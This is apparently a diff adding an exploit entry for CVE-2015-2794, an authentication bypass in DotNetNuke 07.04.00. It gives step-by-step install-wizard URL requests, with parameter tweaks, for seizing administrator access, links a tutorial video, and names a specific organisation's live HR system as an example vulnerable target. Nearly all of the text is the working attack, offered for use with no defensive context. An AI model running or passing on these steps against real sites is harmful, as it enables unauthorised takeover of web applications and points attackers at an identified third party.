@@ -1,0 +1,17 @@
+# Exploit Title: DotNetNuke 07.04.00 Administration Authentication Bypass
+# CVE: CVE-2015-2794
+
+Step 1: find Dotnetnuke ver 07.04.00
+Step 2: /Install/InstallWizard.aspx?__VIEWSTATE=
+Step 3: Fill all infor
+Step 4: CLick continue if it don't work, just add &culture=en-US&executeinstall
+or you get any error ex: 500,... just removing __VIEWSTATE=
+Install/InstallWizard.aspx?culture=en-US&executeinstall
+Step 5: Login /Home/tabid/36/ctl/Login/Default.aspx
+-> This Exploit work on 2013,2014,2015 version!
+
+TUTORIAL VIDEO
+https://www.youtube.com/watch?v=3zT80OxE5W0
+
+Example Web Vulnerable :
+http://hr-system.mbk.co.id/
